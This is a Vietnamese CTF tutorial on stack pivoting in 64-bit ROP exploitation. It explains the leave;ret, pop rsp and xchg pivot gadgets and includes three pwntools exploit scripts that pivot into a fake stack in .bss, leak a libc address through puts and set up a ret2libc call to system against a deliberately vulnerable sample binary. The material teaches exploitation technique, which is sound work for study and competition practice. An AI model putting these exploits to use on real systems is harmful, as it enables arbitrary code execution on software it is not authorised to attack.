Stack Pivot

Khi buffer overflow quá ngắn cho cả chuỗi ROP — chỉ đủ 2–3 gadget: ta "lái" rsp sang một vùng khác đã kiểm soát (bss/heap đã ghi sẵn chuỗi ROP dài) rồi tiếp tục ROP ở đó. Bài này đi các gadget pivot số thật: leave; ret, pop rsp, xchg rsp, rax.

Bài này nói về cái gì?

Vấn đề: overflow chỉ cho ghi đè ~16–24 byte sau saved RIP — không đủ cho chuỗi ROP (ret2libc, execve...) cần hàng trăm byte.

Pivot: ghi chuỗi ROP dài vào một vùng khác (bss/heap bạn kiểm soát) trước, rồi dùng 1–2 gadget để đổi rsp trỏ về vùng đó → CPU "ret" tiếp vào chuỗi dài.

Gadget pivot: leave; ret (rsp=rbp; pop rbp — cần kiểm soát rbp), pop rsp; ret, xchg rsp, rax; ret, add rsp, N; ret.

Nếu chỉ nhớ một điều: buffer ngắn → ghi ROP dài vào bss → pivot rsp về bss (leave;ret hay pop rsp) → tiếp ROP.

⚡ COMBAT CARD — dán chạy khi đang thi
🚦 Dùng khi

Overflow ngắn (chỉ đủ ~2-3 qword sau RIP) · nhưng có nơi ghi chuỗi dài (bss qua read, hoặc buffer cũ) · có gadget pivot.

🔀 leave; ret (phổ biến nhất) 
leave = mov rsp,rbp ; pop rbp     # rsp ← rbp
# ĐK: kiểm soát rbp (saved rbp) = fake_stack - 8
payload = pad + p64(fake_stack - 8) + p64(leave_ret)
# leave: rsp=rbp=fake_stack-8; pop rbp → rsp=fake_stack; ret → chain[0]
🔀 pop rsp; ret 
payload = pad + p64(pop_rsp) + p64(fake_stack)   # rsp ← fake_stack
🔀 xchg rsp, rax (khi rax trỏ fake)

Nếu một hàm trả về con trỏ vào rax (vd read vào bss trả buf): xchg rsp, rax; ret → rsp = buf.

⚠️ Bẫy

leave;ret cần saved rbp = fake−8 (vì pop rbp sau mov). Chuỗi ở fake_stack phải bắt đầu bằng gadget (không phải rbp value). ASLR: fake_stack phải là địa chỉ biết (bss no-PIE, hoặc leak heap).

01 / NỀN TẢNG BẮT BUỘC

rsp là "con trỏ chương trình ROP"

Trong ROP, rsp quyết định gadget kế được chạy (ret pop từ rsp). Nếu ta đổi rsp sang một vùng ta đã ghi sẵn chuỗi gadget, thì ret kế sẽ chạy chuỗi đó — stack pivot. Giống như "nhảy" con trỏ chương trình sang một "bộ nhớ chương trình" mới, lớn hơn.

Định nghĩa nhanh

stack pivot

Đổi rsp sang vùng kiểm soát.

fake stack

Vùng (bss/heap) chứa chuỗi ROP dài.

leave; ret

mov rsp,rbp; pop rbp; ret.

pivot gadget

Gadget đổi rsp (pop rsp, xchg...).

rbp

Base pointer; leave dùng nó set rsp.

read into bss

Ghi chuỗi dài vào bss trước khi pivot.

02 / VÌ SAO CÓ KỸ THUẬT

Không gian hẹp

Nhiều đề giới hạn độ dài input (vd read(0, buf, 0x30) chỉ cho tràn vài qword), nhưng chuỗi khai thác (ret2libc 2 giai đoạn, execve, SROP frame 0xf8 byte) cần nhiều chỗ hơn. Stack pivot giải quyết: dùng chút chỗ ít ỏi để chuyển hướng sang một vùng rộng ta đã (hoặc sẽ) ghi chuỗi dài. Đây là kỹ thuật "cầu nối" quan trọng, hay kết hợp với mọi kỹ thuật ROP khác.

03 / leave; ret · MỤC LÕI

Pivot bằng leave; ret (số thật)

leave = mov rsp, rbp + pop rbp. Nếu ta kiểm soát saved rbp (ghi đè được nó), thì sau leave: rsp = rbp_ta_chọn, rồi pop rbp làm rsp+8, rồi ret nhảy tới [rsp].

Bố cục (số thật, fake=bss 0x404100)

bufferb"A"*OFF (lấp tới saved rbp)
0x4040f8saved rbp = fake − 8 (bss 0x404100 − 8)
0x40117csaved RIP = leave; ret gadget
@ 0x404100fake_stack: [pop rdi][binsh][ret][system] ... (ghi trước qua read)
Vì sao fake−8leave làm rsp=rbp rồi pop rbp (rsp+8). Muốn rsp dừng đúng ở fake (để ret chạy chain[0]), cần rbp=fake−8: sau pop rbp, rsp=fake−8+8=fake. chain[0] tại fake.

07 / EXPLOIT ĐẦY ĐỦ

read vào bss → pivot → ret2libc (overflow ngắn)

// vuln.c — gcc vuln.c -o vuln -no-pie -fno-stack-protector
// read(0, buf, 0x30) — chỉ tràn tới saved rbp + saved RIP (ngắn!)
// nhưng có hàm read khác / vòng lặp để ghi bss.
# BẢN A — giai đoạn 1 ghi chuỗi dài vào bss, giai đoạn 2 pivot bằng leave;ret.
from pwn import *
exe  = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
p = process(exe.path)

OFF       = 0x20            # tới saved rbp
leave_ret = 0x40117c
read_plt  = exe.plt.read
fake      = exe.bss(0x400)      # 0x404100

# chuỗi DÀI sẽ nằm ở fake (ret2libc leak): pop_rdi, puts@got, puts@plt, main...
pop_rdi = 0x401263
chain = flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main)

# GIAI ĐOẠN 1: read(0, fake, len) để ghi chuỗi, rồi pivot
# dùng chính overflow ngắn: set rbp=fake-8, RIP=leave;ret SAU khi read ghi fake
# (bố cục tùy đề — ý tưởng: ghi chain vào fake, rồi leave;ret pivot về fake)
pay1  = b"A"*OFF
pay1 += p64(fake - 8)       # saved rbp = fake-8
pay1 += p64(leave_ret)       # saved RIP = leave;ret → pivot
# trước đó (hoặc qua read riêng) đã ghi 'chain' vào fake
p.send(fit({0: chain}, filler=b"\x00", length=0x200))   # ghi fake
p.send(pay1)
# → leave;ret: rsp=fake → chạy chain → leak puts → rebase → giai đoạn 2 system
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc.address = leak - libc.sym.puts
# ... giai đoạn 2: ret2libc system như bài ret2libc ...
p.interactive()
Thành thậtSố leave_ret=0x40117c, fake=0x404100, OFF=0x20 là của binary mẫu. Bố cục "ghi fake rồi pivot" rất tùy đề (có lúc đề cho sẵn 2 lần read). Cốt lõi: rbp=fake−8, RIP=leave;ret. Dựng & kiểm bằng gdb (break tại leave, xem rsp).
# BẢN B — pivot bằng pop rsp; ret (gọn hơn leave, không cần rbp).
from pwn import *
exe = ELF("./vuln", checksec=False); p = process(exe.path)
OFF = 0x28                # tới saved RIP
pop_rsp = 0x401189
fake = exe.bss(0x400)
# ghi chain vào fake trước (read), rồi:
p.send(b"A"*OFF + p64(pop_rsp) + p64(fake))   # rsp ← fake
p.interactive()
pop rsp vs leavepop rsp đơn giản hơn (khỏi lo rbp) nhưng hiếm trong binary. leave;ret gần như luôn có (mọi hàm kết thúc bằng leave). Ưu tiên leave nếu không có pop rsp.
# BẢN C — pwntools: dùng SigreturnFrame/pivot thủ công; ROP không tự pivot.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False); p = process(exe.path)
OFF=0x20; leave_ret=0x40117c; fake=exe.bss(0x400)
r = ROP(exe)
r.call(exe.plt.puts, [exe.got.puts]); r.call(exe.sym.main)
p.send(fit({0: r.chain()}, length=0x200))       # ghi chain vào fake
p.send(b"A"*OFF + p64(fake-8) + p64(leave_ret))  # pivot
# ... nhận leak, rebase, giai đoạn 2 ...
p.interactive()
pwntoolsROP class KHÔNG tự pivot — ta dựng chain rồi tự thêm bước pivot (rbp+leave;ret). ROP.chain() lo phần chuỗi dài.

09 / GỠ LỖI

Khi pivot không ăn

rbp sai

leave cần rbp=fake−8. Kiểm ±8.

fake chưa ghi chain

Ghi chuỗi dài vào fake TRƯỚC khi pivot.

PIE

fake random. Leak base, fake = bss+base.

Chain lệch 8

chain[0] phải đúng tại rsp sau pivot.

Không có leave;ret

Dùng pop rsp/xchg, hoặc gadget add rsp,N.

bss không ghi được

Dùng heap đã leak, hoặc .data.
